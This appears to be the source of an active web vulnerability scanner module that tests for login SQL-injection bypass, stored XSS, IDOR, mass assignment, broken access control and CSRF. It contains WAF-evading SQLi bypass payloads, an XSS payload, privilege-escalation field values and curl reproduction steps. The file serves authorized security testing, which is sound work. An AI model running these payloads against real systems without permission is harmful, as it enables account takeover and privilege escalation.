"""Orchestrated, session-aware vulnerability checks.

These checks don't fit the per-parameter ``BaseModule`` shape because they need
context the single-request modules don't have: an authenticated session, a
*second* identity, the full crawl surface, or a "inject here, observe there"
(second-order) flow. Keeping them here keeps each one isolated and testable
while the per-parameter modules stay simple.

Checks implemented (mapped to common bug classes):

* :func:`check_auth_bypass`     — SQLi/logic auth bypass on login forms.
* :func:`check_stored_xss`      — second-order XSS: inject a canary, find it
                                  rendered unencoded elsewhere.
* :func:`check_bola`            — IDOR/BOLA on ``/<resource>/<id>`` APIs using
                                  two identities.
* :func:`check_mass_assignment` — privilege escalation by sending extra fields.
* :func:`check_broken_access`   — authorization matrix over admin/internal URLs.
* :func:`check_csrf`            — state-changing endpoints lacking CSRF defenses.

Every check returns ``List[Finding]`` and degrades gracefully (returns ``[]``)
when its preconditions aren't met (no auth, no candidate endpoints, etc.).
"""

from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional
from urllib.parse import urljoin, urlparse
import json as _json
import logging
import random
import re
import string

from .modules.base import Finding

logger = logging.getLogger("vulnscanner")


@dataclass
class ActiveContext:
    """Everything the orchestrated checks need to run."""

    base_url: str
    crawl: object                       # CrawlResult (avoid import cycle)
    make_client: Callable[[Dict], object]  # cookies -> HTTPClient
    primary_cookies: Dict = field(default_factory=dict)
    secondary_cookies: Dict = field(default_factory=dict)
    auth: object = None                 # Authenticator (for cookie flags / relogin)
    config: Dict = field(default_factory=dict)

    # Convenience clients (built lazily).
    def anon(self):
        return self.make_client({})

    def user_a(self):
        return self.make_client(self.primary_cookies)

    def user_b(self):
        return self.make_client(self.secondary_cookies)


def _rand(n: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


# ---------------------------------------------------------------------------
# 1. Authentication bypass (login SQLi / logic)
# ---------------------------------------------------------------------------

# Username payloads whose oracle is "did we get logged in?", not page size.
# Ordered comment-FIRST: many naive WAFs blacklist " OR "/"="/UNION but let a
# lone quote + comment through, so `admin'--` bypasses where `' OR '1'='1` is
# blocked. We never stop at the first blocked payload — we escalate down the
# list, because a 200 "Invalid characters" page is a *reason to try harder*,
# not a reason to give up.
_AUTH_BYPASS_PAYLOADS = [
    # Comment-only: closes the username string and comments out the password
    # check. Survives blacklist WAFs that only look for OR/=/UNION.
    "admin'-- ",
    "admin'--",
    "admin'#",
    "admin')-- ",
    "admin')--",
    "admin') #",
    # Tautologies (caught by naive WAFs, but free to try as escalation).
    "' OR 1=1#",
    "' OR '1'='1'-- ",
    "' OR 1=1-- ",
    "admin' OR '1'='1",
    '" OR ""="',
]

# Body markers that mean "the WAF/app rejected the input" — i.e. our payload
# reached a filter. Seeing these is a signal to ESCALATE to other variants,
# never to abandon the parameter.
_WAF_BLOCK_MARKERS = (
    "invalid character", "illegal character", "not allowed", "blocked",
    "forbidden input", "malicious", "waf", "bad request",
)


def _is_login_form(form) -> bool:
    fields = {f.lower() for f in form.fields}
    has_pw = any(form.field_types.get(n) == "password" or "pass" in n.lower() for n in form.fields)
    has_user = any(n.lower() in ("username", "user", "email", "login", "uname") for n in form.fields)
    return has_pw and has_user and form.method == "POST"


def check_auth_bypass(ctx: ActiveContext) -> List[Finding]:
    """Detect SQLi/logic auth bypass on login forms.

    Oracle: a login form returns a *failed-login* page for wrong credentials
    (typically 200, no session). If injecting ``admin'--`` into the username
    instead yields a redirect away from the login page **and** a session cookie,
    authentication was bypassed. This is the right oracle for login SQLi —
    error/boolean size heuristics miss it because the page doesn't error, it
    simply logs you in.
    """
    findings: List[Finding] = []
    seen_actions = set()

    # The authenticated crawl often can't SEE the login form: once we hold a
    # session, the navigation drops the "Login" link, so /login is never linked
    # and never crawled. Always probe the login URL(s) directly (anonymously) and
    # add any login form we find to the candidate set.
    login_forms = [f for f in ctx.crawl.forms if _is_login_form(f)]
    login_forms += _fetch_login_forms(ctx, {f.action for f in login_forms})

    for form in login_forms:
        if not _is_login_form(form) or form.action in seen_actions:
            continue
        seen_actions.add(form.action)

        user_field = next(
            (n for n in form.fields
             if n.lower() in ("username", "user", "email", "login", "uname")),
            None,
        )
        pass_field = next(
            (n for n in form.fields
             if form.field_types.get(n) == "password" or "pass" in n.lower()),
            None,
        )
        if not user_field or not pass_field:
            continue

        client = ctx.anon()

        def _attempt(username: str, password: str):
            data = {**form.fields, user_field: username, pass_field: password}
            return client.post(form.action, data=data)  # follows redirects off? see below

        # Baseline: clearly-wrong credentials → expected to FAIL.
        client.follow_redirects = False
        base_user = "nouser_" + _rand()
        baseline = _attempt(base_user, "wrongpw_" + _rand())
        if baseline is None:
            continue
        baseline_logged_in = _login_succeeded(baseline, form.action)
        if baseline_logged_in:
            # Wrong creds already "succeed" → can't use this oracle reliably.
            logger.debug("[auth-bypass] %s: baseline wrong-creds looks logged in; skip", form.action)
            continue

        for payload in _AUTH_BYPASS_PAYLOADS:
            resp = _attempt(payload, "x")
            if resp is None:
                continue
            if _login_succeeded(resp, form.action):
                logger.debug("[auth-bypass] %s: bypass via %r", form.action, payload)
                findings.append(Finding(
                    vuln_type="SQL Injection (Authentication Bypass)",
                    url=form.action,
                    method="POST",
                    parameter=user_field,
                    payload=payload,
                    evidence=(
                        f"Login with {user_field}={payload!r} returned a logged-in "
                        f"session (HTTP {resp.status_code}, "
                        f"Location={resp.headers.get('Location','')!r}) while invalid "
                        f"credentials did not — authentication was bypassed."
                    ),
                    confidence="high",
                    details=(
                        f"The {user_field!r} field is injectable in the authentication "
                        f"query. The payload {payload!r} comments out the password check "
                        f"(or always-trues the WHERE clause), logging in as the first/"
                        f"named user without a valid password.\n"
                        f"Remediation: use parameterised queries for the login lookup "
                        f"and verify the password with a constant-time hash comparison."
                    ),
                    reproduction=(
                        f"# 1. Baseline — wrong creds fail (stays on login):\n"
                        f"$ curl -si -d '{user_field}=nouser&{pass_field}=wrong' '{form.action}'\n"
                        f"# 2. Inject the bypass into the username:\n"
                        f"$ curl -si -d '{user_field}={payload}&{pass_field}=x' '{form.action}'\n"
                        f"# 3. Step 2 returns a redirect + session cookie = logged in as admin."
                    ),
                ))
                break  # one finding per login form is enough

    return findings


def _fetch_login_forms(ctx: ActiveContext, already: set):
    """Fetch likely login URLs anonymously and return any login forms found.

    Needed because an authenticated crawl can't reach /login (it's unlinked once
    you're logged in). We reuse the crawler's form parser so the FormInfo shape
    matches what the rest of this check expects.
    """
    from .crawler import _LinkFormParser, FormInfo

    candidates = []
    auth = getattr(ctx, "auth", None)
    if auth is not None and getattr(auth, "login_url", None):
        candidates.append(auth.login_url)
    for p in ("/login", "/signin", "/account/login", "/admin/login", "/auth/login"):
        candidates.append(_abs(ctx, p))

    client = ctx.anon()
    out = []
    seen_urls = set()
    for url in candidates:
        if url in seen_urls:
            continue
        seen_urls.add(url)
        try:
            r = client.get(url)
        except Exception:
            r = None
        if r is None or r.status_code != 200 or "html" not in (r.headers.get("Content-Type", "").lower() or "html"):
            continue
        p = _LinkFormParser()
        try:
            p.feed(r.text or "")
        except Exception:
            continue
        for form in p.forms:
            action = form["action"] or url
            action = action if action.startswith(("http://", "https://")) else urljoin(url, action)
            if action in already:
                continue
            fields = {i["name"]: i["value"] for i in form["inputs"]}
            ftypes = {i["name"]: i["type"] for i in form["inputs"]}
            fi = FormInfo(
                action=action, method=form["method"], fields=fields,
                field_types=ftypes, has_csrf_token=False, source_url=url,
            )
            if _is_login_form(fi):
                out.append(fi)
    return out


def _login_succeeded(resp, login_url: str) -> bool:
    """Generic 'are we logged in now?' oracle for a login POST response."""
    if resp is None:
        return False
    set_cookie = resp.headers.get("Set-Cookie", "")
    location = resp.headers.get("Location", "")
    if 300 <= resp.status_code < 400:
        dest = urljoin(login_url, location).lower()
        if "login" not in dest and "signin" not in dest:
            return True  # redirected away from login = success
    # Some apps 200 with a session cookie and no "invalid credentials" text.
    if resp.status_code == 200 and set_cookie:
        body = (resp.text or "").lower()
        if not any(s in body for s in ("invalid", "incorrect", "try again", "wrong")):
            return True
    return False


# ---------------------------------------------------------------------------
# 2. Stored / second-order XSS
# ---------------------------------------------------------------------------

# Free-text field names worth injecting a stored payload into.
_STORED_TEXT_HINTS = (
    "body", "comment", "review", "message", "content", "text", "description",
    "bio", "about", "note", "feedback", "title", "name", "subject",
)
# Field names to never treat as the stored sink (auth/search/structural).
_STORED_SKIP = ("password", "passwd", "csrf", "token", "q", "search", "email", "username")


def check_stored_xss(ctx: ActiveContext) -> List[Finding]:
    """Second-order XSS: inject a unique canary via POST forms, then re-crawl
    and look for it rendered **unencoded** anywhere (incl. other pages).

    Why a canary + re-fetch: stored XSS doesn't reflect in the immediate
    response, so reflected-XSS logic misses it entirely. We submit a token
    wrapped in a script/markup payload, then fetch candidate render pages and
    check whether the raw (unencoded) markup came back — proof the stored value
    is rendered without escaping.
    """
    findings: List[Finding] = []
    client = ctx.user_a()

    # Candidate POST forms with at least one free-text field.
    seen = set()
    for form in ctx.crawl.forms:
        if form.method != "POST":
            continue
        text_fields = [
            n for n in form.fields
            if n.lower() not in _STORED_SKIP
            and (form.field_types.get(n) in ("text", "textarea", None)
                 or any(h in n.lower() for h in _STORED_TEXT_HINTS))
        ]
        text_fields = [n for n in text_fields if any(h in n.lower() for h in _STORED_TEXT_HINTS)] or text_fields
        if not text_fields:
            continue
        key = (form.action, tuple(sorted(form.fields)))
        if key in seen:
            continue
        seen.add(key)

        token = "okrx" + _rand(10)
        canary = f'"><svg/onload=alert({token})><script>{token}</script>'
        data = dict(form.fields)
        for tf in text_fields:
            data[tf] = canary
        # Fill any obviously-required non-text fields with safe defaults.
        for n in data:
            if not data[n]:
                data[n] = "1"

        post_resp = client.post(form.action, data=data)
        if post_resp is None:
            continue

        # Where might it render? The form's own page, the action page, and any
        # crawled page sharing the same path prefix (e.g. /product/<id>).
        render_urls = _stored_render_candidates(ctx, form)
        for ru in render_urls:
            r = client.get(ru)
            if r is None:
                continue
            body = r.text or ""
            # Require the TAG-bearing form with its angle brackets intact. A bare
            # `onload=alert(token)` substring is not proof: if the app encodes
            # `<`/`>`, that fragment can survive as harmless text and would be a
            # false positive (same trap as reflected XSS). Real stored XSS means
            # the `<svg…>` / `<script>` markup itself came back unencoded.
            raw_present = (
                f"<script>{token}</script>" in body
                or f"<svg/onload=alert({token})>" in body
            )
            if raw_present:
                logger.debug("[stored-xss] canary %s rendered raw at %s", token, ru)
                findings.append(Finding(
                    vuln_type="Cross-Site Scripting (Stored / Second-Order)",
                    url=ru,
                    method="GET",
                    parameter=",".join(text_fields),
                    payload=canary,
                    evidence=(
                        f"Canary submitted to {form.action} (field "
                        f"{','.join(text_fields)}) rendered UNENCODED at {ru}: "
                        f"found raw '<script>{token}</script>'."
                    ),
                    confidence="high",
                    details=(
                        f"Input stored via {form.action} is later rendered without "
                        f"HTML-encoding at {ru}, so injected markup executes for every "
                        f"visitor of that page (stored XSS). Higher impact than reflected "
                        f"XSS: no victim interaction with a crafted link is required.\n"
                        f"Remediation: HTML-encode stored content on output and apply a "
                        f"strict Content-Security-Policy."
                    ),
                    reproduction=(
                        f"# 1. Submit the payload (authenticated):\n"
                        f"$ curl -s -b <cookie> -d '{text_fields[0]}=<script>alert(1)</script>' '{form.action}'\n"
                        f"# 2. Load the render page and grep for the raw script:\n"
                        f"$ curl -s '{ru}' | grep -o '<script>{token}</script>'\n"
                        f"# 3. Open {ru} in a browser — the alert fires for any viewer."
                    ),
                ))
                break  # one finding per injection point

    return findings


def _stored_render_candidates(ctx: ActiveContext, form) -> List[str]:
    """URLs where a value posted to *form* might be rendered."""
    cands = [form.source_url]
    # action like /product/3/review → render page /product/3
    path = urlparse(form.action).path
    m = re.match(r"(.*/\w+/\d+)/\w+/?$", path)
    if m:
        cands.append(urljoin(ctx.base_url, m.group(1)))
    # also re-scan all crawled HTML pages (bounded) as render targets
    for p in ctx.crawl.pages:
        if "html" in (p.content_type or "").lower() and p.url not in cands:
            cands.append(p.url)
    # dedup, keep order, cap
    out = []
    for u in cands:
        if u not in out:
            out.append(u)
    return out[:25]


# ---------------------------------------------------------------------------
# 3. IDOR / BOLA on /<resource>/<id> APIs (two identities)
# ---------------------------------------------------------------------------

_BOLA_DEFAULT_RESOURCES = [
    "orders", "order", "users", "user", "invoices", "invoice",
    "accounts", "account", "carts", "cart", "messages", "documents",
    "files", "tickets", "profiles", "profile", "transactions",
]


def check_bola(ctx: ActiveContext) -> List[Finding]:
    """Detect broken object-level authorization on numeric-id API endpoints.

    Strategy: derive an API base from JS-mined paths (or /api), then for each
    likely resource probe ``/<base>/<resource>/<id>`` as low-priv user A over a
    small id range. If A pulls back **two or more distinct** authenticated JSON
    objects, the endpoint isn't scoping objects to their owner. When a second
    identity B is available we confirm cross-account access (A and B both read
    the same object) for a high-confidence verdict.
    """
    findings: List[Finding] = []
    if not ctx.primary_cookies:
        return findings  # needs an authenticated session

    a = ctx.user_a()
    b = ctx.user_b() if ctx.secondary_cookies else None

    bases = _api_bases(ctx)
    tested = set()

    for base in bases:
        for resource in _BOLA_DEFAULT_RESOURCES:
            ep = f"{base.rstrip('/')}/{resource}"
            if ep in tested:
                continue
            tested.add(ep)

            objs = {}  # id -> (size, body)
            for oid in range(1, 6):
                r = a.get(f"{ctx.base_url.rstrip('/')}{ep}/{oid}"
                          if ep.startswith("/") else f"{ep}/{oid}")
                if r is None or r.status_code != 200:
                    continue
                if "json" not in (r.headers.get("Content-Type", "").lower()):
                    continue
                body = r.text or ""
                if len(body) < 5:
                    continue
                objs[oid] = body

            distinct = {b_ for b_ in objs.values()}
            if len(objs) >= 2 and len(distinct) >= 2:
                # Cross-account confirmation with identity B.
                cross = False
                sample_id = sorted(objs)[0]
                if b is not None:
                    rb = b.get(_full(ctx, ep, sample_id))
                    if rb is not None and rb.status_code == 200 and (rb.text or "") == objs[sample_id]:
                        cross = True

                leak = _spot_sensitive(next(iter(distinct)))
                findings.append(Finding(
                    vuln_type="IDOR / BOLA (Object-Level Authorization)",
                    url=_full(ctx, ep, sample_id),
                    method="GET",
                    parameter="<id>",
                    payload=f"{ep}/<id>",
                    evidence=(
                        f"As one low-privilege user, {len(objs)} distinct objects were "
                        f"readable at {ep}/<id> (ids {sorted(objs)})"
                        + (" — also readable by a second user (cross-account)." if cross
                           else ".")
                        + (f" Leaked field(s): {leak}." if leak else "")
                    ),
                    confidence="high" if (cross or leak) else "medium",
                    details=(
                        f"The endpoint {ep}/<id> returns objects by id without checking "
                        f"that the caller owns them. Any authenticated user can enumerate "
                        f"and read other users' records.\n"
                        f"Remediation: enforce an ownership check (object.user_id == "
                        f"session.user_id) on every object access."
                    ),
                    reproduction=(
                        f"# As a normal user, walk the ids:\n"
                        f"$ for id in 1 2 3 4 5; do\n"
                        f"    curl -s -b <cookie> '{_full(ctx, ep, 0).rsplit('/',1)[0]}/'$id; echo\n"
                        f"  done\n"
                        f"# Objects belonging to other users come back with HTTP 200."
                    ),
                ))

    return findings


def _api_bases(ctx: ActiveContext) -> List[str]:
    """Candidate API base paths from JS-mined paths, else a sensible default."""
    bases = set()
    for p in getattr(ctx.crawl, "api_paths", []):
        # "/api/account/email" -> "/api"; "/api" -> "/api"
        parts = [seg for seg in p.split("/") if seg]
        if parts and parts[0] == "api":
            bases.add("/api")
    if not bases:
        bases.add("/api")
    bases.add("")  # also try resources at root (/orders/<id>)
    return sorted(bases)


def _full(ctx: ActiveContext, ep: str, oid) -> str:
    path = f"{ep.rstrip('/')}/{oid}"
    if path.startswith("http"):
        return path
    return f"{ctx.base_url.rstrip('/')}{path if path.startswith('/') else '/' + path}"


def _spot_sensitive(body: str) -> str:
    hits = []
    for kw in ("license_key", "password", "email", "secret", "token", "ssn",
               "credit", "address", "FLAG{"):
        if kw.lower() in body.lower():
            hits.append(kw)
    return ", ".join(hits[:4])


# ---------------------------------------------------------------------------
# 4. Mass assignment (privilege escalation via extra fields)
# ---------------------------------------------------------------------------

_SENSITIVE_FIELDS = {
    "role": "admin",
    "is_admin": True,
    "admin": True,
    "account_tier": "wholesale",
    "tier": "wholesale",
    "store_credit": 999999,
    "balance": 999999,
    "verified": True,
    "is_verified": True,
    "is_staff": True,
    "premium": True,
}


def check_mass_assignment(ctx: ActiveContext) -> List[Finding]:
    """Send privilege-bearing fields the client should never control and check
    whether the server accepts them.

    We GET the account/profile object, re-submit it with extra sensitive fields
    (role/is_admin/account_tier/store_credit/…), then GET again. If any
    sensitive field is now reflected/changed, the endpoint binds request data to
    the model without an allow-list (mass assignment / over-posting).
    """
    findings: List[Finding] = []
    if not ctx.primary_cookies:
        return findings

    a = ctx.user_a()
    endpoints = _account_endpoints(ctx)

    for ep in endpoints:
        url = _abs(ctx, ep)
        before = a.get(url)
        if before is None or before.status_code != 200:
            continue
        try:
            base_obj = before.json()
        except Exception:
            continue
        if not isinstance(base_obj, dict):
            continue

        # Only inject fields that aren't already privileged in our favour.
        payload = dict(base_obj)
        injected = {}
        for k, v in _SENSITIVE_FIELDS.items():
            if str(base_obj.get(k, "")).lower() not in (str(v).lower(),):
                payload[k] = v
                injected[k] = v

        # Always probe a numeric privilege field with a FRESH unique value. This
        # makes the check robust even on an account a previous run already
        # elevated (where account_tier/is_admin are maxed and "did it change?"
        # would falsely say no): a random store_credit that can't pre-exist,
        # coming back set, is unambiguous proof the client controlled the field.
        sentinel = random.randint(811111, 988888)
        for nf in ("store_credit", "balance"):
            payload[nf] = sentinel
            injected[nf] = sentinel

        if not injected:
            continue

        # Try PUT then POST (and JSON then form) until something sticks.
        changed = _attempt_mass_assign(a, url, payload, injected)
        if not changed:
            continue

        after = a.get(url)
        if after is None:
            continue
        try:
            after_obj = after.json()
        except Exception:
            after_obj = {}

        accepted = {
            k: after_obj.get(k)
            for k, v in injected.items()
            if _value_matches(after_obj.get(k), v)
        }
        if accepted:
            findings.append(Finding(
                vuln_type="Mass Assignment / Privilege Escalation",
                url=url,
                method="PUT",
                parameter=",".join(accepted),
                payload=_json.dumps(accepted),
                evidence=(
                    f"Sending extra field(s) {list(accepted)} to {ep} changed the "
                    f"account object: now {accepted}. The server bound client-supplied "
                    f"privilege fields without an allow-list."
                ),
                confidence="high",
                details=(
                    f"{ep} accepts and persists request fields that should be "
                    f"server-controlled ({', '.join(accepted)}). An attacker can "
                    f"elevate their own privileges (e.g. become admin / wholesale / "
                    f"grant store credit) by over-posting.\n"
                    f"Remediation: bind only an explicit allow-list of editable fields; "
                    f"never pass the raw request body into the model/ORM update."
                ),
                reproduction=(
                    f"# 1. Read your account:\n"
                    f"$ curl -s -b <cookie> '{url}'\n"
                    f"# 2. Re-submit with an extra privileged field:\n"
                    f"$ curl -s -b <cookie> -X PUT -H 'Content-Type: application/json' \\\n"
                    f"    -d '{_json.dumps(accepted)}' '{url}'\n"
                    f"# 3. Read again — the privileged field stuck."
                ),
            ))
            # One confirmed mass-assignment endpoint is the finding. Stop here so
            # account aliases (/api/account, /api/profile, /api/user) backed by the
            # same object don't each emit a duplicate of the same vulnerability.
            return findings

    return findings


def _attempt_mass_assign(client, url, payload, injected) -> bool:
    """Try PUT/POST × JSON/form; return True if a request was accepted (2xx)."""
    for method in ("put", "post"):
        fn = getattr(client, "put", None) if method == "put" else client.post
        # HTTPClient has no put(); use the session via _request-style fallback.
        try:
            if method == "put":
                r = client._request("PUT", url, json=payload)
            else:
                r = client.post(url, data=payload)
        except Exception:
            r = None
        if r is not None and 200 <= r.status_code < 300:
            return True
    return False


def _account_endpoints(ctx: ActiveContext) -> List[str]:
    eps = set()
    for p in getattr(ctx.crawl, "api_paths", []):
        if any(h in p.lower() for h in ("account", "profile", "user", "me", "settings")):
            # strip trailing action like /api/account/email -> /api/account
            eps.add(re.sub(r"/(email|password|update|edit)$", "", p))
    eps.add("/api/account")
    eps.add("/api/profile")
    eps.add("/api/user")
    return sorted(eps)


# ---------------------------------------------------------------------------
# 5. Broken access control (authorization matrix)
# ---------------------------------------------------------------------------

_ADMIN_PATHS = [
    "/admin", "/admin/", "/admin/orders", "/admin/users", "/admin/dashboard",
    "/admin/settings", "/admin/products", "/admin/customers", "/admin/reports",
    "/manage", "/management", "/internal", "/dashboard",
    "/api/admin", "/api/admin/orders", "/api/admin/users", "/api/internal",
]
_ADMIN_URL_HINTS = ("admin", "internal", "manage", "dashboard", "staff", "backoffice")
_SENSITIVE_BODY_HINTS = (
    "order", "invoice", "customer", "email", "address", "role", "admin",
    "user", "total", "revenue", "license", "ssn", "phone",
)


def check_broken_access(ctx: ActiveContext) -> List[Finding]:
    """Authorization matrix: request admin/internal endpoints with NO session
    and flag those that return 200 + sensitive content instead of 401/403.

    We build the candidate set from a curated admin path list plus any crawled
    URL that *looks* administrative, then probe each unauthenticated. A page
    that serves admin data to an anonymous caller is broken access control —
    the classic "it's only hidden in the nav" mistake.
    """
    findings: List[Finding] = []
    anon = ctx.anon()
    # Do NOT follow redirects: a protected page that 302s to /login would
    # otherwise be fetched as a 200 login page and look "accessible". We want to
    # see the raw 302/401/403 vs a genuine 200-with-data.
    try:
        anon.follow_redirects = False
    except Exception:
        pass

    candidates = list(_ADMIN_PATHS)
    for p in ctx.crawl.pages:
        path = urlparse(p.url).path
        if any(h in path.lower() for h in _ADMIN_URL_HINTS):
            candidates.append(path)
    # dedup preserve order
    seen = set()
    candidates = [c for c in candidates if not (c in seen or seen.add(c))]

    # A reference anonymous home page to distinguish "real admin page" from
    # "SPA index returned for everything".
    home = anon.get(ctx.base_url)
    home_body = (home.text if home is not None else "") or ""

    for path in candidates:
        url = _abs(ctx, path)
        r = anon.get(url)
        if r is None or r.status_code != 200:
            continue
        body = r.text or ""
        if len(body) < 150:
            continue
        # Skip if it's just the public home/login page echoed back.
        if body == home_body:
            continue
        low = body.lower()
        if any(s in low for s in ("sign in", "please log in", "login required")) and "admin" not in low:
            continue
        sensitive_hits = [h for h in _SENSITIVE_BODY_HINTS if h in low]
        looks_admin_url = any(h in path.lower() for h in _ADMIN_URL_HINTS)
        if looks_admin_url and len(sensitive_hits) >= 2:
            findings.append(Finding(
                vuln_type="Broken Access Control (Missing Authorization)",
                url=url,
                method="GET",
                parameter="(no session)",
                payload="N/A",
                evidence=(
                    f"Anonymous GET {path} returned HTTP 200 with sensitive content "
                    f"(indicators: {', '.join(sensitive_hits[:5])}) — no authentication "
                    f"required for an administrative endpoint."
                ),
                confidence="high",
                details=(
                    f"{path} is reachable without any session and exposes administrative "
                    f"data. The endpoint is only 'protected' by being hidden from the UI "
                    f"navigation, not by a server-side authorization check.\n"
                    f"Remediation: enforce authentication + role checks on every admin "
                    f"route server-side; never rely on hidden links."
                ),
                reproduction=(
                    f"# Request the admin page with NO cookies:\n"
                    f"$ curl -s '{url}'\n"
                    f"# It returns admin data (HTTP 200) instead of 401/403."
                ),
            ))

    return findings


# ---------------------------------------------------------------------------
# 6. CSRF (state-changing endpoint without anti-CSRF defenses)
# ---------------------------------------------------------------------------

_STATE_CHANGING_HINTS = (
    "email", "password", "account", "profile", "settings", "update", "delete",
    "transfer", "add", "remove", "create", "change", "set",
)


def check_csrf(ctx: ActiveContext) -> List[Finding]:
    """Flag state-changing endpoints that lack CSRF defenses.

    Heuristic (all must hold): the endpoint changes state (POST/PUT to an
    account/settings-like action), the form/request carries no anti-CSRF token,
    and the session cookie is not ``SameSite=Strict`` (so a cross-site request
    would still carry it). Read-only GET forms (search) are ignored.
    """
    findings: List[Finding] = []

    samesite = (getattr(ctx.auth, "cookie_samesite", None) or "").lower()
    # SameSite=Strict fully blocks cross-site sends → not CSRF-able.
    if samesite == "strict":
        logger.debug("[csrf] session cookie is SameSite=Strict — skipping CSRF checks")
        return findings

    seen = set()
    for form in ctx.crawl.forms:
        if form.method not in ("POST", "PUT"):
            continue
        action_l = form.action.lower()
        if not any(h in action_l for h in _STATE_CHANGING_HINTS):
            continue
        if form.has_csrf_token:
            continue
        # skip auth forms themselves (login/register aren't CSRF targets here)
        if any(s in action_l for s in ("/login", "/register", "/signin", "/logout")):
            continue
        if form.action in seen:
            continue
        seen.add(form.action)

        ss_note = (f"SameSite={samesite or 'unset'}")
        findings.append(Finding(
            vuln_type="Cross-Site Request Forgery (CSRF)",
            url=form.action,
            method=form.method,
            parameter=",".join(form.fields) or "(body)",
            payload="N/A",
            evidence=(
                f"State-changing {form.method} {form.action} has no anti-CSRF token "
                f"and the session cookie is {ss_note} (not Strict) — a cross-site page "
                f"can forge this request on a victim's behalf."
            ),
            confidence="medium",
            details=(
                f"{form.action} performs a state change but ships no CSRF token, and the "
                f"session cookie's SameSite policy ({ss_note}) does not block cross-site "
                f"sends. An attacker page can auto-submit this request using the victim's "
                f"session.\n"
                f"Remediation: require a per-session CSRF token on state-changing requests "
                f"and set session cookies to SameSite=Strict (or Lax + token)."
            ),
            reproduction=(
                f"# An attacker-hosted page auto-submits:\n"
                f"#   <form action='{form.action}' method='{form.method}'>\n"
                f"#     <input name='{next(iter(form.fields), 'field')}' value='attacker'>\n"
                f"#   </form><script>document.forms[0].submit()</script>\n"
                f"# Victim (logged in) visiting the page triggers the state change."
            ),
        ))

    return findings


# ---------------------------------------------------------------------------
# Helpers + orchestrator
# ---------------------------------------------------------------------------

def _abs(ctx: ActiveContext, path: str) -> str:
    if path.startswith("http"):
        return path
    return f"{ctx.base_url.rstrip('/')}{path if path.startswith('/') else '/' + path}"


def _value_matches(actual, expected) -> bool:
    """True if the server now reflects the privileged value (loose match)."""
    if actual is None:
        return False
    if isinstance(expected, bool):
        return str(actual).lower() in ("1", "true", "yes") if expected else False
    return str(actual).lower() == str(expected).lower()


_ALL_CHECKS = [
    ("auth-bypass", check_auth_bypass),
    ("broken-access", check_broken_access),
    ("stored-xss", check_stored_xss),
    ("bola", check_bola),
    ("mass-assignment", check_mass_assignment),
    ("csrf", check_csrf),
]


def run_active_checks(ctx: ActiveContext) -> List[Finding]:
    """Run every orchestrated check; isolate failures so one can't sink the run."""
    findings: List[Finding] = []
    for name, fn in _ALL_CHECKS:
        try:
            new = fn(ctx)
            if new:
                logger.info("[%s] %d finding(s)", name, len(new))
            findings.extend(new)
        except Exception as exc:
            logger.debug("Active check %s failed: %s", name, exc)
    return findings
